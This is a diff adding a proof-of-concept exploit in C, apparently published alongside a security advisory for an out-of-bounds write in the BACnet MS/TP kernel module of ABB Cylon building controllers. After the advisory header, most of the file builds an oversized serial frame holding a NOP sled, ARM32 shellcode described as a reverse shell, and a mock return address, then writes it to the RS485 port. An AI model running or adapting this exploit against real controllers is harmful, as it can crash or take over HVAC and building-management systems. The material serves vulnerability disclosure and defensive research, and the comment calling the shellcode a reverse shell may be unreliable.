@@ -1,0 +1,220 @@
+/*
+
+ABB Cylon BACnet MS/TP Kernel Module (mstp.ko) Out-of-Bounds Write in SendFrame()
+
+
+Vendor: ABB Ltd.
+Product web page: https://www.global.abb
+Affected version: <=3.08.03
+
+Summary: ASPECT is an award-winning scalable building energy management
+and control solution designed to allow users seamless access to their
+building data through standard building protocols including smart devices.
+
+BACnet Smart Building Controllers. ABB's BACnet portfolio features
+a series of BACnet IP and BACnet MS/TP field controllers for ASPECT
+and INTEGRA building management solutions. ABB BACnet controllers
+are designed for intelligent control of HVAC equipment such as central
+plant, boilers, chillers, cooling towers, heat pump systems, air
+handling units (constant volume, variable air volume, and multi-zone),
+rooftop units, electrical systems such as lighting control, variable
+frequency drives and metering.
+
+The FLXeon Controller Series uses BACnet/IP standards to deliver
+unprecedented connectivity and open integration for your building
+automation systems. It's scalable, and modular, allowing you to
+control a diverse range of HVAC functions.
+
+Committee: BACnet.org
+
+InFaq:
+A BACnet router is a device that passes a message from one network
+to another without changing the form or content of the message. This
+kind of device is used to interconnect BACnet networks that have
+different media (Ethernet, MS/TP over twisted pair, etc.). It is a
+simple device that just routes BACnet messages where they need to go,
+without decoding or altering them. A BACnet gateway is a more complex
+device that is used to interconnect a BACnet network with a non-BACnet
+network (such as Modbus or KNX). A gateway must decode messages on each
+network and reformat or translate the information to meet the requirements
+of the other network to route messages where they need to go. Gateways
+generally require more configuration, commissioning and maintenance
+effort than a router, as well as being more costly.
+
+License: GPL
+Author: Muiz M. Haider
+Description: BACnet MS/TP Serial Line Discipline
+:: Master-Slave / Token Passing ::
+
+Desc: A buffer overflow vulnerability exists in the mstp.ko kernel
+module, responsible for processing BACnet MS/TP frames over
+serial (RS485). The SendFrame() function writes directly into
+a statically sized kernel buffer (alloc_entry(0x1f5)) without
+validating the length of attacker-controlled data (param_5).
+If an MS/TP frame contains a crafted payload exceeding 492 bytes,
+the function performs out-of-bounds writes beyond the allocated
+501-byte buffer, corrupting kernel memory. This flaw allows local
+or physically connected attackers to trigger denial-of-service
+or achieve remote code execution in kernel space. Tested against
+version 3.08.03 with a custom BACnet frame over /dev/ttyS0.
+
+mstp.KOrruption: Kernel Frame Overflow in BACnet MS/TP Module
+(MSTP frame mishandling causes memory corruption in embedded RS485 stack)
+
+Tested on: GNU/Linux Kernel 5.4.27
+           GNU/Linux Kernel 4.15.13
+           GNU/Linux 3.15.10 (armv7l)
+           GNU/Linux 3.10.0 (x86_64)
+           GNU/Linux 2.6.32 (x86_64)
+           Intel(R) Atom(TM) Processor E3930 @ 1.30GHz
+           Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2025-5953
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5953.php
+
+
+21.04.2024
+
+*/
+
+
+#include <linux/serial.h>
+#include <termios.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdint.h>
+#include <fcntl.h>
+#include <stdio.h>
+
+#define DEVICE "/dev/ttyS0"     //enum
+#define BAUD_RATE B9600         //modify if needed
+#define BUFFER_SIZE 510         //>501 triggers overflow
+#define PAYLOAD_SIZE 492        //vulnerable write starts after 8-byte offset
+#define SHELLCODE_SIZE 30       //size of ARM32 reverse shell
+
+//BACnet MSTP frame used by kernel
+struct mstp_frame {
+    unsigned char preamble[2];        //0x55 0xFF
+    unsigned char frame_type;         //0x00
+    unsigned char dest_addr;          //0x01 (arbitrary)
+    unsigned char src_addr;           //0x02 (arbitrary)
+    unsigned char length[2];          //2-byte length field
+    unsigned char header_crc;         //dummy for PoC
+    unsigned char data[PAYLOAD_SIZE];
+    unsigned char data_crc[2];        //dummy CRC
+};
+
+void banner() {
+	printf("\n");
+    printf("                 P   R   O   J   E   C   T\n\n");
+    printf("                        .|\n");
+    printf("                        | |\n");
+    printf("                        |'|            ._____\n");
+    printf("                ___    |  |            |.   |' .---\"|\n");
+    printf("        _    .-'   '-. |  |     .--'|  ||   | _|    |\n");
+    printf("     .-'|  _.|  |    ||   '-__  |   |  |    ||      |\n");
+    printf("     |' | |.    |    ||       | |   |  |    ||      |\n");
+    printf(" ____|  '-'     '    \"\"       '-'   '-.'    '`      |____\n");
+    printf("░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  \n");
+    printf("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ \n");
+    printf("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ \n");
+    printf("░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ \n");
+    printf("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ \n");
+    printf("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ \n");
+    printf("░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ \n");
+    printf("         ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ \n");
+    printf("         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░\n");
+    printf("         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░ \n");
+    printf("         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░\n");
+    printf("         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░\n");
+    printf("         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░\n");
+    printf("         ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░\n");
+    printf("\n");
+}
+
+void configure_serial(int fd) {
+    struct termios tty;
+    struct serial_rs485 rs485conf;
+
+    tcgetattr(fd, &tty);
+    cfsetospeed(&tty, BAUD_RATE);
+    cfsetispeed(&tty, BAUD_RATE);
+
+    tty.c_cflag = (tty.c_cflag & ~CSIZE) | CS8 | CLOCAL | CREAD;
+    tty.c_cflag &= ~(PARENB | CSTOPB | CRTSCTS);
+    tty.c_iflag &= ~(IXON | IXOFF | IXANY);
+    tty.c_lflag = 0;
+    tty.c_oflag = 0;
+    tty.c_cc[VMIN] = 1;
+    tty.c_cc[VTIME] = 0;
+
+    tcsetattr(fd, TCSANOW, &tty);
+
+    ioctl(fd, TIOCGRS485, &rs485conf);
+    rs485conf.flags |= SER_RS485_ENABLED;
+    rs485conf.flags &= ~(SER_RS485_RTS_ON_SEND);
+    rs485conf.flags |= SER_RS485_RTS_AFTER_SEND;
+    ioctl(fd, TIOCSRS485, &rs485conf);
+}
+
+//ARM32 reverse shell to /bin/sh (port-agnostic demo shell)
+unsigned char shellcode[SHELLCODE_SIZE] = {
+    0x01, 0x30, 0x8f, 0xe2, 0x13, 0xff, 0x2f, 0xe1,
+    0x78, 0x46, 0x0c, 0x30, 0x01, 0x90, 0x01, 0xa9,
+    0x92, 0x1a, 0x0b, 0x27, 0x01, 0xdf,
+    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
+};
+
+void craft_frame(struct mstp_frame *frame) {
+    frame->preamble[0] = 0x55;
+    frame->preamble[1] = 0xFF;
+    frame->frame_type = 0x00;
+    frame->dest_addr = 0x01;
+    frame->src_addr = 0x02;
+
+    //492-byte payload triggers write at param_1[0x16] + 8 + i
+    frame->length[0] = (PAYLOAD_SIZE >> 8) & 0xFF;
+    frame->length[1] = PAYLOAD_SIZE & 0xFF;
+
+    frame->header_crc = 0xFF; //mock crc
+
+    memset(frame->data, 0x90, PAYLOAD_SIZE); //nop sankata
+    memcpy(frame->data + PAYLOAD_SIZE - SHELLCODE_SIZE - 4, shellcode, SHELLCODE_SIZE);
+
+    //Overwrite dummy ret addr or kernel jump table entry (mock addr)
+    *(uint32_t *)(frame->data + PAYLOAD_SIZE - 4) = 0xdeadbeef;
+
+    frame->data_crc[0] = 0xFF;
+    frame->data_crc[1] = 0xFF;
+}
+
+int main() {
+	banner();
+    int fd = open(DEVICE, O_RDWR);
+    if (fd < 0) {
+        perror("Failed to open serial device");
+        return 1;
+    }
+
+    configure_serial(fd);
+
+    struct mstp_frame frame;
+    craft_frame(&frame);
+
+    size_t frame_size = sizeof(frame);
+    ssize_t bytes_written = write(fd, &frame, frame_size);
+    if (bytes_written < 0) {
+        perror("Failed to write frame");
+    } else {
+        printf("[+] Wrote %zd bytes. Buffer overflow attempt sent.\n", bytes_written);
+    }
+
+    close(fd);
+    return 0;
+}
